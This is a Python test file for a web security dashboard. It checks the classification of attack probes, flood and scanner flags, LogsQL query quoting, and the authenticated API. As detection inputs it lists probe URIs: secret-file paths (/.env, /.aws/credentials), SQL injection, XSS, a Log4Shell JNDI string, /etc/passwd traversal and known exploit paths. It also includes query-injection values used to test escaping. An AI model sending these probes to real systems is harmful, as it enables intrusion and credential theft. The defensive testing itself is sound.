"""Tests for the security view: detection rules, query shape and API."""

from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, patch

import pytest

import backend.api as api_module
from backend import security_analytics as sec


def _ip(**overrides):
    ip = {
        "requests": 100, "client_errors": 0, "not_found": 0, "denied": 0,
        "rate_limited": 0, "server_errors": 0, "waf_blocks": 0,
        "distinct_paths": 3, "peak_per_minute": 10,
    }
    ip.update(overrides)
    return ip


def _endpoint(**overrides):
    ep = {"requests": 100, "distinct_ips": 2, "client_errors": 0, "server_errors": 0,
          "top_ips": [{"key": "1.2.3.4", "count": 10}], "peak_per_minute": 10}
    ep.update(overrides)
    return ep


def _codes(flags):
    return {f["code"] for f in flags}


class TestIpFlags:
    def test_normal_client_has_no_flag(self):
        assert sec.ip_flags(_ip()) == []

    def test_flood_and_burst(self):
        assert _codes(sec.ip_flags(_ip(peak_per_minute=sec.FLOOD_PEAK_PER_MINUTE))) == {"flood"}
        assert _codes(sec.ip_flags(_ip(peak_per_minute=sec.BURST_PEAK_PER_MINUTE))) == {"burst"}

    def test_scanner_needs_many_404_on_many_paths(self):
        many_404_same_path = _ip(not_found=500, client_errors=500, requests=5000, distinct_paths=1)
        assert "scanner" not in _codes(sec.ip_flags(many_404_same_path))
        scanner = _ip(not_found=sec.SCANNER_MIN_NOT_FOUND, client_errors=40,
                      distinct_paths=sec.SCANNER_MIN_DISTINCT_PATHS)
        assert "scanner" in _codes(sec.ip_flags(scanner))

    def test_waf_denied_rate_limited(self):
        flags = sec.ip_flags(_ip(waf_blocks=sec.WAF_MIN_BLOCKS, denied=sec.DENIED_MIN,
                                 rate_limited=sec.RATE_LIMITED_MIN))
        assert _codes(flags) == {"waf", "denied", "rate_limited"}

    def test_mostly_errors(self):
        assert "errors" in _codes(sec.ip_flags(_ip(requests=50, client_errors=45)))
        assert "errors" not in _codes(sec.ip_flags(_ip(requests=10, client_errors=10)))


class TestEndpointFlags:
    def test_normal_endpoint_has_no_flag(self):
        assert sec.endpoint_flags(_endpoint()) == []

    def test_hammered(self):
        assert "hammered" in _codes(sec.endpoint_flags(_endpoint(peak_per_minute=400)))

    def test_concentrated_on_one_client(self):
        ep = _endpoint(requests=1000, top_ips=[{"key": "1.2.3.4", "count": 900}])
        assert "concentrated" in _codes(sec.endpoint_flags(ep))

    def test_probed_by_many_clients(self):
        ep = _endpoint(requests=100, distinct_ips=20, client_errors=95)
        assert "probed" in _codes(sec.endpoint_flags(ep))


class TestQueries:
    def test_internal_traffic_is_excluded_by_default(self):
        queries = sec.build_overview_queries(60, include_internal=False)
        assert all("internal:=false" in q for q in queries.values())
        queries = sec.build_overview_queries(60, include_internal=True)
        assert not any("internal:=false" in q for q in queries.values())

    def test_every_query_reads_access_records_only(self):
        overview = sec.build_overview_queries(60, include_internal=False)
        details = sec.build_detail_queries(60, False, OVERVIEW_ROWS)
        assert all(q.startswith('{kind="access"}') for q in [*overview.values(), *details.values()])

    @pytest.mark.parametrize("minutes", [5, 60, 360, 361, 1440, 1441, sec.MAX_WINDOW_MINUTES])
    def test_peak_buckets_stay_few(self, minutes):
        # ~100 candidate IPs x buckets per IP must stay small.
        _, bucket_minutes = sec.rate_interval(minutes)
        assert minutes / bucket_minutes <= 360

    @pytest.mark.parametrize("minutes", [5, 60, 360, 1440, sec.MAX_WINDOW_MINUTES])
    def test_timeline_stays_readable(self, minutes):
        step = {"1m": 1, "5m": 5, "15m": 15, "1h": 60}[sec.timeline_interval(minutes)]
        assert minutes / step <= 200

    def test_detail_queries_are_limited_to_candidates(self):
        details = sec.build_detail_queries(60, False, OVERVIEW_ROWS)
        assert 'client_ip:in("98.82.0.52", "8.8.8.8", "45.148.10.38")' in details["ip_stats"]
        assert '(request_host:="sowarm.ai" path:="/static.zip")' in details["endpoint_peaks"]

    def test_no_candidates_no_detail_query(self):
        assert sec.build_detail_queries(60, False, {}) == {}

    def test_untrusted_values_are_quoted(self):
        overview = {"by_requests": [{"client_ip": 'x") | delete'}],
                    "endpoints": [{"request_host": "a", "path": '/"; drop'}]}
        details = sec.build_detail_queries(60, False, overview)
        assert 'client_ip:in("x\\") | delete")' in details["ip_stats"]
        assert 'path:="/\\"; drop"' in details["endpoint_ips"]

    def test_clamp_window(self):
        assert sec.clamp_window(1) == sec.MIN_WINDOW_MINUTES
        assert sec.clamp_window(10**6) == sec.MAX_WINDOW_MINUTES
        assert sec.clamp_window("junk") == sec.DEFAULT_WINDOW_MINUTES


class TestWindow:
    NOW = datetime(2026, 10, 23, 12, 0, tzinfo=timezone.utc)

    def test_last_minutes_by_default(self):
        start, end, minutes = sec.resolve_window(60, None, None, self.NOW)
        assert (end - start, end, minutes) == (timedelta(hours=1), self.NOW, 60)

    def test_a_picked_bucket_can_be_one_minute(self):
        start, end, minutes = sec.resolve_window(60, "2026-10-23T11:15:00.000Z", "2026-10-23T11:16:00Z", self.NOW)
        assert (start.minute, end.minute, minutes) == (15, 16, 1)
        assert start.tzinfo is not None

    def test_the_current_bucket_ends_now(self):
        _, end, minutes = sec.resolve_window(60, "2026-10-23T11:45:00Z", "2026-10-23T12:00:00Z",
                                             self.NOW - timedelta(minutes=5))
        assert end == self.NOW - timedelta(minutes=5) and minutes == 10

    @pytest.mark.parametrize("start,end", [
        ("2026-10-23T11:00:00Z", None),                     # half a range
        ("yesterday", "2026-10-23T11:00:00Z"),               # not a timestamp
        ("2026-10-23T11:00:00Z", "2026-10-23T10:00:00Z"),    # backwards
        ("2026-10-23T12:30:00Z", "2026-10-23T12:45:00Z"),    # entirely in the future
        ("2026-10-01T00:00:00Z", "2026-10-23T00:00:00Z"),    # beyond 7 days
    ])
    def test_invalid_ranges_are_refused(self, start, end):
        with pytest.raises(ValueError):
            sec.resolve_window(60, start, end, self.NOW)


class TestAttacks:
    @pytest.mark.parametrize("uri,code", [
        ("/.env", "secrets"),
        ("/api/.env.production", "secrets"),
        ("/.git/config", "secrets"),
        ("/.aws/credentials", "secrets"),
        ("/wp-login.php", "wordpress"),
        ("/blog/wp-admin/setup-config.php", "wordpress"),
        ("/index.php?id=1%20UNION%20SELECT%20password", "injection"),
        ("/search?q=<script>alert(1)</script>", "injection"),
        ("/x?h=${jndi:ldap://evil/a}", "injection"),
        ("/static/../../etc/passwd", "traversal"),
        ("/download?file=..%2f..%2fetc%2fpasswd", "traversal"),
        ("/cgi-bin/luci/;stok=/locale", "exploits"),
        ("/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", "exploits"),
        ("/actuator/env", "exploits"),
        ("/phpmyadmin/index.php", "php"),
        ("/shell.php", "php"),
        ("/backup.sql", "backups"),
        ("/site.tar.gz", "backups"),
    ])
    def test_probes_are_classified(self, uri, code):
        assert sec.classify_request(uri) == code

    @pytest.mark.parametrize("uri", [
        "/", "/api/users?page=2", "/static/app.3f9a.js", "/.well-known/acme-challenge/token",
        "/.github/workflows", "/environment", "/owner/repo", "/docs/selection", "/assets/logo.png",
    ])
    def test_ordinary_requests_are_not(self, uri):
        assert sec.classify_request(uri) is None

    def test_a_request_counts_for_its_most_severe_category_only(self):
        # Matches both PHP and injection: counted as injection.
        assert sec.classify_request("/index.php?q=union select 1") == "injection"
        injection = sec.attack_filter("injection")
        php = sec.attack_filter("php")
        assert "NOT" not in injection
        assert php.count("NOT ") == 5  # every category above it
        with pytest.raises(ValueError):
            sec.attack_filter("ddos")

    def test_patterns_are_quoted_for_logsql(self):
        queries = sec.build_overview_queries(60, include_internal=False)
        assert set(f"attack_{c['code']}" for c in sec.ATTACK_CATEGORIES) <= set(queries)
        assert 'path:~"(?i)\\\\.(bak|' in queries["attack_backups"]
        assert queries["attack_samples"].endswith(f"limit {sec.ATTACK_SAMPLES}")

    def test_summary(self):
        overview = {
            "attack_secrets": [{"requests": "40", "clients": "3", "answered": "1",
                                "last_seen": "2026-09-19T17:02:00Z"}],
            "attack_wordpress": [{"requests": "7", "clients": "1", "answered": "0"}],
            "attack_injection": [{"requests": "0", "clients": "0", "answered": "0"}],
            "attack_samples": [
                {"request_host": "a.io", "uri": "/.env", "client_ip": "1.1.1.1", "n": "30", "answered": "1"},
                {"request_host": "c.io", "uri": "/.env", "client_ip": "2.2.2.2", "n": "5", "answered": "0"},
                {"request_host": "a.io", "uri": "/.env", "client_ip": "2.2.2.2", "n": "1", "answered": "0"},
                {"request_host": "a.io", "uri": "/.git/HEAD?x=1", "client_ip": "2.2.2.2", "n": "5", "answered": "0"},
                {"request_host": "b.io", "uri": "/wp-login.php", "client_ip": "3.3.3.3", "n": "7", "answered": "0"},
                {"request_host": "b.io", "uri": "/ordinary", "client_ip": "3.3.3.3", "n": "9", "answered": "0"},
            ],
        }
        result = sec.attacks(overview)
        assert [c["code"] for c in result] == ["secrets", "wordpress"]  # severity order, none empty
        secrets = result[0]
        assert (secrets["requests"], secrets["clients"], secrets["answered"]) == (40, 3, 1)
        assert secrets["top_targets"][0] == {"target": "/.env", "count": 36, "answered": 1,
                                             "hosts": ["a.io", "c.io"]}
        # A path category shows the path, without the query string.
        assert secrets["top_targets"][1]["target"] == "/.git/HEAD"
        assert secrets["top_ips"] == [{"key": "1.1.1.1", "count": 30}, {"key": "2.2.2.2", "count": 11}]
        assert result[1]["last_seen"] is None


class TestRequestsQuery:
    def test_every_filter_is_quoted(self):
        query = sec.build_requests_query(False, ip="1.2.3.4", host='a" | delete', path="/x",
                                         uri="/x?y=1", rule="SQLi", text="wp login")
        assert query.startswith('{kind="access"} ')
        assert 'client_ip:="1.2.3.4"' in query and 'request_host:="a\\" | delete"' in query
        assert 'path:="/x"' in query and 'uri:="/x?y=1"' in query and 'rule_msg:="SQLi"' in query
        # Words in the URI must all be there.
        assert 'uri:i("wp") AND uri:i("login")' in query
        assert query.endswith("| fields _time, event, client_ip, request_host, method, uri, status, "
                              "router, user_agent, rule_msg, duration_ms")

    def test_a_client_asked_for_is_shown_even_internal(self):
        assert "internal:=false" not in sec.build_requests_query(False, ip="10.0.0.2")
        assert "internal:=false" in sec.build_requests_query(False)

    def test_status_and_category(self):
        waf = sec.build_requests_query(False, status="waf")
        assert 'event:="waf_block"' in waf and 'event:="request"' not in waf
        edge = sec.build_requests_query(False, status="edge", category="secrets")
        assert edge.count('event:="request"') == 1
        assert 'router:"pulsarcd-blocklist"*' in edge and "path:~" in edge
        assert 'event:="request"' in sec.build_requests_query(False, category="php")

    @pytest.mark.parametrize("filters", [{"status": "teapot"}, {"category": "ddos"}])
    def test_unknown_choices_are_refused(self, filters):
        with pytest.raises(ValueError):
            sec.build_requests_query(False, **filters)


# Rows as VictoriaLogs returns them: every value a string.
OVERVIEW_ROWS = {
    "totals": [{"requests": "1200", "unique_ips": "3", "ok": "400", "client_errors": "790",
                "server_errors": "10", "denied": "40", "rate_limited": "5"}],
    "timeline": [{"_time": "2026-09-19T17:00:00Z", "ok": "400", "client_errors": "790",
                  "server_errors": "10"}],
    "by_requests": [{"client_ip": "98.82.0.52", "n": "700"}, {"client_ip": "8.8.8.8", "n": "400"}],
    "by_errors": [{"client_ip": "98.82.0.52", "n": "700"}, {"client_ip": "45.148.10.38", "n": "90"}],
    "endpoints": [{"request_host": "sowarm.ai", "path": "/static.zip", "requests": "500",
                   "distinct_ips": "1", "client_errors": "500", "server_errors": "0"}],
    "waf_total": [{"n": "12"}],
    "waf_ips": [{"client_ip": "45.148.10.38", "n": "12"}],
    "waf_rules": [{"rule_msg": "SQL Injection Attempt", "n": "12"}],
}


def _ip_rows(ip, requests, peak, **counts):
    return {
        "ip_stats": {"client_ip": ip, "requests": str(requests),
                     "client_errors": str(counts.get("client_errors", 0)),
                     "not_found": str(counts.get("not_found", 0)), "denied": "0",
                     "rate_limited": "0", "server_errors": "0",
                     "waf_blocks": str(counts.get("waf_blocks", 0)),
                     "distinct_paths": str(counts.get("distinct_paths", 1)), "distinct_hosts": "1",
                     "internal": "false", "first_seen": "2026-09-19T17:01:00Z",
                     "last_seen": "2026-09-19T17:02:00Z"},
        "ip_hosts": {"client_ip": ip, "request_host": "sowarm.ai", "n": str(requests)},
        "ip_paths": {"client_ip": ip, "path": "/", "n": str(requests)},
        "ip_agents": {"client_ip": ip, "user_agent": "curl/8", "n": str(requests)},
        "ip_peaks": {"client_ip": ip, "peak": str(peak)},
    }


def _detail_rows(*ips):
    out = {"endpoint_ips": [{"request_host": "sowarm.ai", "path": "/static.zip",
                             "client_ip": "98.82.0.52", "n": "500"}],
           "endpoint_peaks": [{"request_host": "sowarm.ai", "path": "/static.zip", "peak": "497"}]}
    for ip in ips:
        for name, row in ip.items():
            out.setdefault(name, []).append(row)
    return out


DETAIL_ROWS = _detail_rows(
    _ip_rows("8.8.8.8", 400, 20),
    _ip_rows("98.82.0.52", 700, 497, client_errors=700, not_found=700, distinct_paths=300),
    _ip_rows("45.148.10.38", 90, 30, client_errors=90, not_found=5, waf_blocks=12),
)


class TestSummarize:
    START = datetime(2026, 9, 19, 17, 0, 0, tzinfo=timezone.utc)
    NOW = datetime(2026, 9, 19, 17, 3, 0, tzinfo=timezone.utc)

    def _summarize(self, overview, details, minutes=60, include_internal=False):
        return sec.summarize(overview, details, minutes=minutes, include_internal=include_internal,
                             start=self.START, end=self.NOW, generated_at=self.NOW)

    def test_candidates_are_merged_without_duplicates(self):
        assert sec.candidate_ips(OVERVIEW_ROWS) == ["98.82.0.52", "8.8.8.8", "45.148.10.38"]

    def test_payload(self):
        result = self._summarize(OVERVIEW_ROWS, DETAIL_ROWS)
        assert result["totals"] == {
            "requests": 1200, "unique_ips": 3, "client_errors": 790, "server_errors": 10,
            "denied": 40, "rate_limited": 5, "waf_blocks": 12,
            "flagged_ips": 2, "flagged_endpoints": 1, "attack_requests": 0, "attack_answered": 0,
        }
        # Every minute of the window, the empty ones as zeros
        assert result["timeline"][0] == {"timestamp": "2026-09-19T17:00:00.000Z",
                                         "ok": 400, "client_errors": 790, "server_errors": 10}
        assert result["timeline"][1:] == [
            {"timestamp": f"2026-09-19T17:0{m}:00.000Z", "ok": 0, "client_errors": 0, "server_errors": 0}
            for m in (1, 2)]
        # Flagged clients first, most severe first; the quiet one last.
        assert [ip["ip"] for ip in result["ips"]] == ["98.82.0.52", "45.148.10.38", "8.8.8.8"]
        scanner = result["ips"][0]
        assert _codes(scanner["flags"]) == {"flood", "scanner", "errors"}
        assert scanner["user_agent"] == "curl/8"
        assert scanner["internal"] is False
        assert scanner["top_paths"] == [{"key": "/", "count": 700}]
        endpoint = result["endpoints"][0]
        assert (endpoint["host"], endpoint["path"]) == ("sowarm.ai", "/static.zip")
        assert _codes(endpoint["flags"]) == {"hammered", "concentrated"}
        assert result["waf_rules"] == [{"key": "SQL Injection Attempt", "count": 12}]

    def test_long_windows_report_a_per_minute_peak(self):
        # 24 h window: 5-minute buckets, so a 1500-request bucket is 300/min.
        details = _detail_rows(_ip_rows("8.8.8.8", 1500, 1500))
        result = self._summarize(OVERVIEW_ROWS, details, minutes=1440)
        assert result["ips"][0]["peak_per_minute"] == 300.0

    def test_no_candidates(self):
        result = self._summarize({}, {}, include_internal=True)
        assert result["ips"] == [] and result["endpoints"] == []
        assert result["totals"]["requests"] == 0
        assert result["include_internal"] is True


class TestLogStore:
    async def test_detail_queries_only_with_candidates(self):
        from backend.config import VictoriaLogsConfig
        from backend.log_store import LogStore

        store = LogStore(VictoriaLogsConfig())
        calls = []

        async def run(queries, **window):
            calls.append(queries)
            return OVERVIEW_ROWS if len(calls) == 1 else DETAIL_ROWS
        with patch.object(store, "_run_queries", side_effect=run):
            result = await store.get_security_overview(minutes=60)
        await store.close()
        assert len(calls) == 2
        assert "ip_stats" in calls[1]
        assert result["totals"]["flagged_ips"] == 2

    async def test_unreachable_store_returns_an_empty_overview(self):
        from backend.config import VictoriaLogsConfig
        from backend.log_store import LogStore
        from shared.victorialogs import VictoriaLogsError

        store = LogStore(VictoriaLogsConfig())
        with patch.object(store, "_run_queries", AsyncMock(side_effect=VictoriaLogsError("down"))):
            result = await store.get_security_overview(minutes=60)
        await store.close()
        assert result["error"] == "Access data unavailable"
        assert result["ips"] == []


class TestAgainstVictoriaLogs:
    """The LogsQL itself, run by a real VictoriaLogs."""

    async def test_attacks_slot_and_request_explorer(self, vlogs):
        import uuid
        from datetime import timedelta

        from backend.config import VictoriaLogsConfig
        from backend.log_store import LogStore
        from shared.victorialogs import KIND_ACCESS, access_row

        store = LogStore(VictoriaLogsConfig(url=vlogs))
        host = f"attack-{uuid.uuid4().hex[:8]}.test"
        now = datetime.now(timezone.utc).replace(microsecond=0)
        prober = "198.51.100." + str(uuid.uuid4().int % 250 + 1)

        def request(uri, status, ago, ip=prober, router="app@swarm"):
            return {"timestamp": now - ago, "host": host, "event": "request", "client_ip": ip,
                    "internal": False, "request_host": host, "method": "GET",
                    "path": uri.split("?")[0], "uri": uri, "status": status, "router": router,
                    "duration_ms": 1.0, "size": 10, "user_agent": "probe/1"}

        docs = [request("/.env", 404, timedelta(seconds=i)) for i in range(5)]
        docs += [request("/.env", 200, timedelta(seconds=6)),                      # leaked!
                 request("/wp-login.php", 404, timedelta(seconds=7)),
                 request("/index.php?id=1 UNION SELECT 1", 403, timedelta(seconds=8)),
                 request("/home", 200, timedelta(seconds=9)),
                 request("/home", 403, timedelta(seconds=10), router="pulsarcd-blocklist@http"),
                 # Twenty minutes earlier: outside the slot below.
                 request("/.git/config", 404, timedelta(minutes=20))]
        await store.client.insert([access_row(d) for d in docs], KIND_ACCESS)
        await store.client.flush()

        result = await store.get_security_overview(minutes=60)
        assert "error" not in result
        # Other tests share this VictoriaLogs: read this host's rows only.
        by_code = {c["code"]: c for c in result["attacks"]}
        secrets = by_code["secrets"]
        assert secrets["requests"] >= 7 and secrets["answered"] >= 1
        target = next(t for t in secrets["top_targets"] if t["target"] == "/.env")
        assert host in target["hosts"] and target["count"] >= 6 and target["answered"] >= 1
        assert any(host in t["hosts"] for t in by_code["wordpress"]["top_targets"])
        injection = next(t for t in by_code["injection"]["top_targets"] if host in t["hosts"])
        assert injection["target"] == "/index.php?id=1 UNION SELECT 1"
        assert "php" not in by_code or all(host not in t["hosts"] for t in by_code["php"]["top_targets"])

        # The last five minutes only: the .git probe is out of it.
        slot = await store.get_security_overview(
            minutes=60, start=(now - timedelta(minutes=5)).isoformat(), end=now.isoformat())
        assert "range" in slot
        assert all(t["target"] != "/.git/config" for c in slot["attacks"] for t in c["top_targets"]
                   if host in t["hosts"])

        async def explore(**filters):
            data = await store.get_security_requests({"host": host, **filters}, minutes=60)
            assert "error" not in data
            return sorted((e["uri"], e["status"]) for e in data["events"])

        assert await explore(category="secrets", status="2xx") == [("/.env", 200)]
        assert await explore(category="injection") == [("/index.php?id=1 UNION SELECT 1", 403)]
        assert await explore(status="edge") == [("/home", 403)]
        assert len(await explore(text="env")) == 6
        assert len(await explore(ip=prober, path="/.git/config")) == 1
        events = (await store.get_security_requests({"host": host}, minutes=60))["events"]
        assert events[0]["client_ip"] == prober
        await store.close()

    async def test_scanner_is_detected(self, vlogs):
        import uuid
        from datetime import timedelta

        from backend.config import VictoriaLogsConfig
        from backend.log_store import LogStore
        from shared.victorialogs import KIND_ACCESS, access_row

        store = LogStore(VictoriaLogsConfig(url=vlogs))
        host = f"edge-{uuid.uuid4().hex[:8]}"
        now = datetime.now(timezone.utc)
        scanner = "203.0.113." + str(uuid.uuid4().int % 250 + 1)
        docs = [{"timestamp": now - timedelta(seconds=i), "host": host, "event": "request",
                 "client_ip": scanner, "internal": False, "request_host": host, "method": "GET",
                 "path": f"/probe-{i}", "uri": f"/probe-{i}", "status": 404, "router": "app@swarm",
                 "duration_ms": 1.5, "size": 10, "user_agent": "scan/1"} for i in range(40)]
        docs.append({"timestamp": now, "host": host, "event": "waf_block", "client_ip": scanner,
                     "internal": False, "path": "/x", "uri": "/x?id=1", "rule_id": "942100",
                     "rule_msg": f"SQL Injection {host}"})
        await store.client.insert([access_row(d) for d in docs], KIND_ACCESS)
        await store.client.flush()
        result = await store.get_security_overview(minutes=60)
        await store.close()

        assert "error" not in result
        ip = next(ip for ip in result["ips"] if ip["ip"] == scanner)
        assert ip["requests"] == 40 and ip["not_found"] == 40 and ip["waf_blocks"] == 1
        assert ip["distinct_paths"] == 40 and ip["user_agent"] == "scan/1"
        assert "scanner" in _codes(ip["flags"])
        assert {"key": f"SQL Injection {host}", "count": 1} in result["waf_rules"]


class TestSecurityApi:
    def test_requires_authentication(self, client):
        assert client.get("/api/security/overview").status_code == 401

    def test_overview(self, client, auth_headers):
        payload = sec.empty_overview(360, True, datetime(2026, 9, 19))
        mock = AsyncMock(return_value=payload)
        with patch.object(api_module.logstore, "get_security_overview", mock):
            resp = client.get("/api/security/overview?minutes=360&include_internal=true",
                              headers=auth_headers)
        assert resp.status_code == 200
        assert resp.json()["window_minutes"] == 360
        mock.assert_awaited_once_with(minutes=360, include_internal=True)

    @pytest.mark.parametrize("minutes", [1, 100000])
    def test_window_bounds(self, client, auth_headers, minutes):
        resp = client.get(f"/api/security/overview?minutes={minutes}", headers=auth_headers)
        assert resp.status_code == 422

    def test_ip_events(self, client, auth_headers):
        events = [{"timestamp": "2026-09-19T17:00:00", "event": "request", "status": 404}]
        mock = AsyncMock(return_value=events)
        with patch.object(api_module.logstore, "get_security_ip_events", mock):
            resp = client.get("/api/security/ips/2a01:0e0a::0001?minutes=60", headers=auth_headers)
        assert resp.status_code == 200
        assert resp.json() == {"ip": "2a01:e0a::1", "internal": False,
                               "blocked": None, "events": events}
        mock.assert_awaited_once_with("2a01:e0a::1", minutes=60)

    def test_invalid_ip(self, client, auth_headers):
        resp = client.get("/api/security/ips/not-an-ip", headers=auth_headers)
        assert resp.status_code == 400

    def test_a_picked_bucket_is_passed_as_a_range(self, client, auth_headers):
        payload = sec.empty_overview(15, False, datetime(2026, 9, 19))
        mock = AsyncMock(return_value=payload)
        with patch.object(api_module.logstore, "get_security_overview", mock):
            resp = client.get("/api/security/overview?minutes=1440&start=2026-09-18T10:15:00Z"
                              "&end=2026-09-18T10:30:00Z", headers=auth_headers)
        assert resp.status_code == 200
        mock.assert_awaited_once_with(minutes=1440, include_internal=False,
                                      start="2026-09-18T10:15:00Z", end="2026-09-18T10:30:00Z")

    @pytest.mark.parametrize("query", ["start=2026-09-18T10:15:00Z",
                                       "start=2026-09-18T10:30:00Z&end=2026-09-18T10:15:00Z",
                                       "start=soon&end=later"])
    def test_invalid_ranges_are_400(self, client, auth_headers, query):
        for url in (f"/api/security/overview?{query}", f"/api/security/ips/1.2.3.4?{query}",
                    f"/api/security/requests?{query}"):
            assert client.get(url, headers=auth_headers).status_code == 400, url

    def test_ip_events_of_a_range(self, client, auth_headers):
        mock = AsyncMock(return_value=[])
        with patch.object(api_module.logstore, "get_security_ip_events", mock):
            resp = client.get("/api/security/ips/1.2.3.4?start=2026-09-18T10:15:00Z&end=2026-09-18T10:16:00Z",
                              headers=auth_headers)
        assert resp.status_code == 200
        mock.assert_awaited_once_with("1.2.3.4", minutes=60, start="2026-09-18T10:15:00Z",
                                      end="2026-09-18T10:16:00Z")

    def test_requests(self, client, auth_headers):
        result = {"events": [], "limit": sec.MAX_REQUESTS}
        mock = AsyncMock(return_value=result)
        with patch.object(api_module.logstore, "get_security_requests", mock):
            resp = client.get("/api/security/requests?minutes=360&ip=2a01:0e0a::0001&host=a.io"
                              "&q=env&status=4xx&category=secrets&include_internal=true",
                              headers=auth_headers)
        assert resp.status_code == 200 and resp.json() == result
        mock.assert_awaited_once_with(
            {"ip": "2a01:e0a::1", "host": "a.io", "text": "env", "status": "4xx", "category": "secrets"},
            minutes=360, include_internal=True)

    def test_requests_refuse_invalid_filters(self, client, auth_headers):
        assert client.get("/api/security/requests?ip=nope", headers=auth_headers).status_code == 400
        mock = AsyncMock(side_effect=ValueError("Unknown status filter: teapot"))
        with patch.object(api_module.logstore, "get_security_requests", mock):
            resp = client.get("/api/security/requests?status=teapot", headers=auth_headers)
        assert resp.status_code == 400
        assert resp.json()["detail"] == "Unknown status filter: teapot"
